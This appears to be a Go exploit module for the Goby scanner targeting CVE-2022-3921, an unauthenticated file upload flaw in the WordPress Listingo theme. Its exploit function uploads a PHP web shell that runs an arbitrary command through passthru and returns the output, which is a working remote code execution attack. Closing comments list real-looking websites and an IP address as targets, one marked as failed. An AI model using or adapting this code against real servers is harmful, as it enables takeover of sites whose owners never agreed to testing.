package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress theme Listingo listingo_temp_uploader File Upload Vulnerability (CVE-2022-3921)",
    "Description": "<p>WordPress theme Listingo is a WordPress theme for displaying business listings and directories.</p><p>WordPress theme Listingo version before 3.2.7 has a code problem vulnerability. The vulnerability is caused by not verifying the files to be uploaded through AJAX operations. Attackers can upload malicious webshells to obtain server permissions.</p>",
    "Product": "wordpress-theme-listingo",
    "Homepage": "https://themeforest.net/item/listingo-business-listing-wordpress-directory-theme/20617051",
    "DisclosureDate": "2022-11-10",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/themes/listingo\"",
    "GobyQuery": "body=\"wp-content/themes/listingo\"",
    "Level": "3",
    "Impact": "<p>WordPress theme Listingo version before 3.2.7 has a code problem vulnerability. The vulnerability is caused by not verifying the files to be uploaded through AJAX operations. Attackers can upload malicious webshells to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f.\">https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2022-3921"
    ],
    "CNNVD": [
        "CNNVD-202212-2925"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress 主题 Listingo listingo_temp_uploader 功能任意文件上传漏洞（CVE-2022-3921）",
            "Product": "wordpress-theme-listingo",
            "Description": "<p>WordPress theme Listingo 是一款显示商业列表和目录的WordPress主题。<br></p><p>WordPress theme Listingo 3.2.7之前版本存在代码问题漏洞，该漏洞源于不会验证要通过AJAX操作上传的文件，攻击者可上传恶意webshell获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f\">https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f</a>。<br></p>",
            "Impact": "<p>WordPress theme Listingo 3.2.7之前版本存在代码问题漏洞，该漏洞源于不会验证要通过AJAX操作上传的文件，攻击者可上传恶意webshell获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress theme Listingo listingo_temp_uploader File Upload Vulnerability (CVE-2022-3921)",
            "Product": "wordpress-theme-listingo",
            "Description": "<p>WordPress theme Listingo is a WordPress theme for displaying business listings and directories.<br></p><p>WordPress theme Listingo version before 3.2.7 has a code problem vulnerability. The vulnerability is caused by not verifying the files to be uploaded through AJAX operations. Attackers can upload malicious webshells to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f.\">https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f.</a><br></p>",
            "Impact": "<p>WordPress theme Listingo version before 3.2.7 has a code problem vulnerability. The vulnerability is caused by not verifying the files to be uploaded through AJAX operations. Attackers can upload malicious webshells to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-admin/admin-ajax.php?action=listingo_temp_uploader"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg")
			cfg.Data = "------WebKitFormBoundary8rVjnfcgxgKoytcg\r\nContent-Disposition: form-data; name=\"listingo_uploader\"; filename=\"phppoc.php\"\r\nContent-Type: text/php\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n------WebKitFormBoundary8rVjnfcgxgKoytcg\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nStart Upload\r\n------WebKitFormBoundary8rVjnfcgxgKoytcg--\r\n"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, ",\"filename\":\"") {
				shellPath := regexp.MustCompile(",\"filename\":\"(.*?).php\",").FindStringSubmatch(resp.RawBody)
				uri2 := "/wp-content/uploads/wp-custom-uploader/" + shellPath[1] + ".php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/wp-admin/admin-ajax.php?action=listingo_temp_uploader"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg")
			cfg.Data = fmt.Sprintf("------WebKitFormBoundary8rVjnfcgxgKoytcg\r\nContent-Disposition: form-data; name=\"listingo_uploader\"; filename=\"phppoc.php\"\r\nContent-Type: text/php\r\n\r\n<?php passthru(\"%s\"); ?>\r\n------WebKitFormBoundary8rVjnfcgxgKoytcg\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nStart Upload\r\n------WebKitFormBoundary8rVjnfcgxgKoytcg--\r\n", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, ",\"filename\":\"") {
				shellPath := regexp.MustCompile(",\"filename\":\"(.*?).php\",").FindStringSubmatch(resp.RawBody)
				uri2 := "/wp-content/uploads/wp-custom-uploader/" + shellPath[1] + ".php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}

//hunter资产:1216
//https://banmjob.com
//https://stonestations.com //失败
//http://85.187.144.207